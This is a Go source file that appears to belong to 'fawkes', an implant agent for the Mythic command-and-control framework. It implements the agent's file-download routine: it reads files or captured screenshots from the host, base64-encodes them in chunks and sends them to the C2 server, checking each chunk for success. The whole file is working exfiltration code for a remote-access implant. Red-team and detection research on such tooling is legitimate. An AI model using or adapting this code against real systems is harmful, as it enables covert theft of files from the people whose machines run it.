package files

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fawkes/pkg/structs"
	"fmt"
	"io"
	"math"
	"path/filepath"
	"strings"
)

var SendToMythicChannel = make(chan structs.SendFileToMythicStruct, 10)

// listenForSendFileToMythicMessages reads from SendToMythicChannel to send file transfer messages to Mythic
func listenForSendFileToMythicMessages() {
	for fileToMythic := range SendToMythicChannel {
		fileToMythic.TrackingUUID = generateUUID()
		fileToMythic.FileTransferResponse = make(chan json.RawMessage)
		fileToMythic.Task.Job.SetFileTransfer(fileToMythic.TrackingUUID, fileToMythic.FileTransferResponse)
		go sendFileMessagesToMythic(fileToMythic)
	}
}

// sendFileMessagesToMythic constructs a file transfer message to send to Mythic
func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
	var size int64
	if sendFileToMythic.Data == nil {
		if sendFileToMythic.File == nil {
			errResponse := sendFileToMythic.Task.NewResponse()
			errResponse.UserOutput = "No data and no file specified when trying to send a file to Mythic"
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		} else {
			fi, err := sendFileToMythic.File.Stat()
			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = sendFileToMythic.Task.ID
				errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
			size = fi.Size()
		}
	} else {
		size = int64(len(*sendFileToMythic.Data))
	}

	chunks := uint64(math.Ceil(float64(size) / FILE_CHUNK_SIZE))
	fileDownloadData := structs.FileDownloadMessage{}
	fileDownloadData.TotalChunks = int(chunks)
	fileDownloadData.FullPath = sendFileToMythic.FullPath
	fileDownloadData.IsScreenshot = sendFileToMythic.IsScreenshot

	if sendFileToMythic.FullPath != "" {
		abspath, err := filepath.Abs(sendFileToMythic.FullPath)
		if err != nil {
			errResponse := sendFileToMythic.Task.NewResponse()
			errResponse.UserOutput = fmt.Sprintf("Error getting full path to file: %s", err.Error())
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		}
		fileDownloadData.FullPath = abspath
	}

	// Create our normal response message and add our Download part to it
	fileDownloadMsg := structs.Response{}
	fileDownloadMsg.TaskID = sendFileToMythic.Task.ID
	fileDownloadMsg.Download = &fileDownloadData

	// Send the initial message to Mythic to announce we have a file to transfer
	sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg

	var fileDetails map[string]interface{}

	for {
		// Wait for a response from the channel
		resp := <-sendFileToMythic.FileTransferResponse
		err := json.Unmarshal(resp, &fileDetails)
		if err != nil {
			errResponse := sendFileToMythic.Task.NewResponse()
			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		}

		if _, ok := fileDetails["file_id"]; ok {
			if ok {
				updateUserOutput := structs.Response{}
				updateUserOutput.TaskID = sendFileToMythic.Task.ID
				updateUserOutput.UserOutput = fmt.Sprintf("{\"file_id\": \"%v\", \"total_chunks\": \"%d\"}\n", fileDetails["file_id"], chunks)
				sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
				break
			} else {
				continue
			}
		}
	}

	var r *bytes.Buffer = nil
	if sendFileToMythic.Data != nil {
		r = bytes.NewBuffer(*sendFileToMythic.Data)
	} else {
		if _, seekErr := sendFileToMythic.File.Seek(0, 0); seekErr != nil {
			errResponse := sendFileToMythic.Task.NewResponse()
			errResponse.UserOutput = fmt.Sprintf("Error seeking file: %s", seekErr.Error())
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		}
	}

	lastPercentCompleteNotified := 0
	for i := uint64(0); i < chunks; {
		if sendFileToMythic.Task.ShouldStop() {
			// Tasked to stop, so bail
			sendFileToMythic.FinishedTransfer <- 1
			return
		}

		partSize := int(math.Min(FILE_CHUNK_SIZE, float64(int64(size)-int64(i*FILE_CHUNK_SIZE))))
		partBuffer := make([]byte, partSize)

		// Create a temporary buffer and read a chunk into that buffer from the file
		if sendFileToMythic.Data != nil {
			_, err := r.Read(partBuffer)
			if err != io.EOF && err != nil {
				errResponse := sendFileToMythic.Task.NewResponse()
				errResponse.UserOutput = fmt.Sprintf("\nError reading from file: %s\n", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
		} else {
			// Skipping i*FILE_CHUNK_SIZE bytes from the beginning of the file
			if _, seekErr := sendFileToMythic.File.Seek(int64(i*FILE_CHUNK_SIZE), 0); seekErr != nil {
				errResponse := sendFileToMythic.Task.NewResponse()
				errResponse.UserOutput = fmt.Sprintf("\nError seeking file: %s\n", seekErr.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
			_, err := sendFileToMythic.File.Read(partBuffer)
			if err != io.EOF && err != nil {
				errResponse := sendFileToMythic.Task.NewResponse()
				errResponse.UserOutput = fmt.Sprintf("\nError reading from file: %s\n", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
		}

		fileDownloadData = structs.FileDownloadMessage{}
		fileDownloadData.ChunkNum = int(i) + 1
		fileID, ok := fileDetails["file_id"].(string)
		if !ok {
			errResponse := sendFileToMythic.Task.NewResponse()
			errResponse.Completed = true
			errResponse.UserOutput = "Error: file_id not found or not a string in Mythic response"
			sendFileToMythic.Task.Job.SendResponses <- errResponse
			sendFileToMythic.FinishedTransfer <- 1
			return
		}
		fileDownloadData.FileID = fileID
		fileDownloadData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		fileDownloadMsg.Download = &fileDownloadData
		sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg

		newPercentComplete := ((fileDownloadData.ChunkNum * 100) / int(chunks))
		if newPercentComplete/10 > lastPercentCompleteNotified && sendFileToMythic.SendUserStatusUpdates {
			response := sendFileToMythic.Task.NewResponse()
			response.Completed = false
			response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
			sendFileToMythic.Task.Job.SendResponses <- response
			lastPercentCompleteNotified = newPercentComplete / 10
		}

		// Wait for a response for our file chunk
		var postResp map[string]interface{}
		for {
			decResp := <-sendFileToMythic.FileTransferResponse
			err := json.Unmarshal(decResp, &postResp)

			if err != nil {
				errResponse := sendFileToMythic.Task.NewResponse()
				errResponse.Completed = true
				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
				sendFileToMythic.Task.Job.SendResponses <- errResponse
				sendFileToMythic.FinishedTransfer <- 1
				return
			}
			break
		}

		if statusStr, ok := postResp["status"].(string); ok && strings.Contains(statusStr, "success") {
			// Only go to the next chunk if this one was successful
			i++
		}
	}
	sendFileToMythic.FinishedTransfer <- 1
}
